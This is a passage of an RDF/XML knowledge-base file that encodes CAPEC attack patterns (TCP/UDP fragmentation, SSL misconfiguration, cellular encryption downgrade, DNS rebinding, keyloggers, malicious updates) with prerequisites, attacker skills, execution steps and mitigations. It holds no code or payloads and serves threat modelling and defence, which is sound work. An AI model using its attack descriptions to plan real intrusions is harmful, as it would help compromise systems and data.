  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::This attack may be mitigated by changing default cache sizes to be larger at the OS level. Additionally rules can be enforced to prune the cache with shorter timeouts for packet reassembly as the cache nears capacity.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack302">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#495">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:130::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#UDP Fragmentation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::770::404::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker480">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#263"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack480"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::829::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted application must utilize a configuration file that an attacker is able to corrupt. In some cases  the attacker must be able to force the (re-)reading of the corrupted file if the file is normally only consulted at startup.::The severity of the attack hinges on how the application responds to the corrupted file. If the application detects the corruption and locks down  this may result in the denial of services provided by the application. If the application fails to detect the corruption  the result could be a more severe denial of service (crash or hang) or even an exploitable buffer overflow. If the application detects the corruption but fails in an unsafe way  this attack could result in the continuation of services but without certain security structures  such as filters or access controls. For example  if the corrupted file configures filters  an unsafe response from an application could result in simply disabling the filtering mechanisms due to the lack of usable configuration data.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::This varies depending on the resources necessary to corrupt the configuration file and the resources needed to force the application to re-read it (if any).::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Restrict write access to logon scripts to necessary administrators.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack410">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#564">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:542::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Run Software at Logon"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::284::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Use libraries and templates that minimize unfiltered input. Use methods that limit entity expansion and throw exceptions on attempted entity expansion. Implementation: Disable altogether the use of inline DTD schemas in your XML parsing objects. If must use DTD  normalize  filter and white list and parse with methods and routines that will detect entity expansion from untrusted sources.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack77">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#491">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:230::NATURE:CanFollow:CAPEC ID:228::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#XML Quadratic Expansion"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::770::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker178">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#217">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:216::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Exploiting Incorrectly Configured SSL"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack178">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#217"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::201::"/>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Determine the configuration levels of either the server or client being targeted  preferably both. This is not a hard requirement  as the attacker can simply assume commonly exploitable configuration settings and blindly attempt them.::STEP:2:PHASE:Experiment:DESCRIPTION:Provide controlled access to the server by the client  by either providing a link for the client to click on  or by positioning one&apos;s self at a place on the network to intercept and control the flow of data between client and server  e.g. MITM (man in the middle).::STEP:3:PHASE:Exploit:DESCRIPTION:Insert the malicious data into the stream that takes advantage of the configuration flaw.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::201::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to the client/server stream.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker needs real-time access to network traffic in such a manner that the attacker can grab needed information from the SSL stream  possibly influence the decided-upon encryption method and options  and perform automated analysis to decipher encrypted material recovered. Tools exist to automate part of the tasks  but to successfully use these tools in an attack scenario requires detailed understanding of the underlying principles.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker needs the ability to sniff traffic  and optionally be able to route said traffic to a system where the sniffing of traffic can take place  and act upon the recovered traffic in real time.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker488">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#322"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack488"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A tool capable of sending and receiving packets from a remote system.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::This attack may be mitigated by enforcing rules at the router following the guidance of RFC1858. The essential part of the guidance is creating the following rule IF FO=1 and PROTOCOL=TCP then DROP PACKET as this mitigated both tiny fragment and overlapping fragment attacks in IPv4. In IPv6 overlapping(RFC5722) additional steps may be required such as deep packet inspection. The delayed fragments may be mitigated by enforcing a timeout on the transmission to receive all packets by a certain time since the first packet is received. According to RFC2460 IPv6 implementations should enforce a rule to discard all fragments if the fragments are not ALL received within 60 seconds of the FIRST arriving fragment.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack301">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#494">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:130::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#TCP Fragmentation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::770::404::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker222">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#606">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:620::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Weakening of Cellular Encryption"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack222">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#606"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::757::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Tracking  Network Reconnaissance::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::757::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Cellular devices that allow negotiating security modes to facilitate backwards compatibility and roaming on legacy networks.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Adversaries can purchase and implement rogue BTS stations at a cost effective rate  and can push a mobile device to downgrade to a non-secure cellular protocol like 2G over GSM or CDMA.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker355">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#538"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack355"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Access to the open source code base being used by the manufacturer in a system being developed or currently deployed at a victim location.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Advanced knowledge about the inclusion and specific usage of an open source code project within system being targeted for infiltration.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::None are known.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack370">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#623">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:189::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Compromising Emanations Attack"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::201::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data Capture vibrations/emissions from the handset or retransmission device display screen to recreat display information from a distance.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker221">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#537"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack221"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::125::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).::The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.::The attacker must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Intelligence about the manufacturer&apos;s operating environment and infrastructure.:LEVEL:Medium::SKILL:Ability to develop  deploy  and maintain a stealth malicious backdoor program remotely in what is essentially a hostile environment.:LEVEL:High::SKILL:Development skills to construct malicious attachments that can be used to exploit vulnerabilities in typical desktop applications or system configurations. The malicious attachments should be crafted well enough to bypass typical defensive systems (IDS  anti-virus  etc):LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker354">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#521"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack354"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Advanced knowledge of hardware capabilities of a manufacturer&apos;s product.::Access to the manufacturer&apos;s documentation.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Ability to read  interpret  and subsequently alter manufacturer&apos;s documentation to cause errors in design specifications.:LEVEL:High::SKILL:Ability to stealthly gain access via remote compromise or physical access to the manufacturer&apos;s documentation.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker487">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#328"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack487"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A tool capable of sending and receiving packets from a remote system.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Strong physical security can help reduce the ability of an adversary to install a keylogger.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack48">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#568">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:569::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Capture Credentials via Keylogger"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker353">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#519"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack353"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Advanced knowledge of software capabilities of a manufacturer&apos;s product.::Access to the manufacturer&apos;s documentation.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Ability to read  interpret  and subsequently alter manufacturer&apos;s documentation to cause errors in system design.:LEVEL:High::SKILL:Ability to stealthly gain access via remote compromise or physical access to the manufacturer&apos;s documentation.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker220">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#20">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:112::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Encryption Brute Forcing"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack220">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#20"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::326::327::693::719::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Determine the ciphertext and the encryption algorithm.::STEP:2:PHASE:Experiment:DESCRIPTION:Perform an exhaustive brute force search of the key space  producing candidate plaintexts and observing if they make sense.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::326::327::693::719::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Ciphertext is known.::Encryption algorithm and key size are known.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Brute forcing encryption does not require much skill.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A powerful enough computer for the job with sufficient CPU  RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge). On average  for a binary key of size N  2^(N/2) trials will be needed to find the key that would decrypt the ciphertext to obtain the original plaintext. Obviously as N gets large the brute force approach becomes infeasible.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker486">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#320"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack486"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.The target OS must support the TCP timestamp option in order to obtain a fingerprint.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::Any type of active probing that involves non-standard packet headers requires the use of raw sockets  which is not available on particular operating systems (Microsoft Windows XP SP 2  for example). Raw socket manipulation on Unix/Linux requires root privileges. A tool capable of sending and receiving packets from a remote system.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker352">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#518"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack352"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Advanced knowledge of software and hardware capabilities of a manufacturer&apos;s product.::Access to the manufacturer&apos;s documentation.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Ability to read  interpret  and subsequently alter manufacturer&apos;s documentation to misrepresent system capabilities.:LEVEL:High::SKILL:Ability to stealthly gain access via remote compromise or physical access to the manufacturer&apos;s documentation.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker485">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#325"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack485"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A tool capable of sending and receiving packets from a remote system.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker172">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#145"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack172"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::354::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must be able to intercept a message from the sender (keeping the recipient from getting it)  modify it  and send the modified message to the recipient.::The sender and recipient must use a checksum to protect the integrity of their message and transmit this checksum in a manner where the adversary can intercept and modify it.::The checksum value must be computable using information known to the adversary. A cryptographic checksum  which uses a key known only to the sender and recipient  would thwart this attack.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary must have a utility that can intercept and modify messages between the sender and recipient.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Changes to registry entries in HKLMSoftwareMicrosoftWindows NTWinlogonNotify that do not correlate with known software  patch cycles  etc are suspicious. New DLLs written to System32 which do not correlate with known good software or patching may be suspicious.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack514">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#579">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:542::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Replace Winlogon Helper DLL"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Validate software updates before installing.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack342">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#186">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:184::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Malicious Software Update"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::494::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Access Control:SCOPE:Availability:SCOPE:ConfidentialityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Access Control Availability Confidentiality Execute Unauthorized Commands Utilize the built-in software update mechanisms of the commercial components to deliver software that could compromise security credentials  enable a denial-of-service attack  or enable tracking.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker60">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#312"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack60"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The ability to monitor and interact with network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::Any type of active probing that involves non-standard packet headers requires the use of raw sockets  which is not available on particular operating systems (Microsoft Windows XP SP 2  for example). Raw socket manipulation on Unix/Linux requires root privileges. A tool capable of sending and receiving packets from a remote system.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker171">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#275">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:194::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#DNS Rebinding"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack171">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#275"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::350::"/>
        </j.0:exploits>
        <j.0:executes>
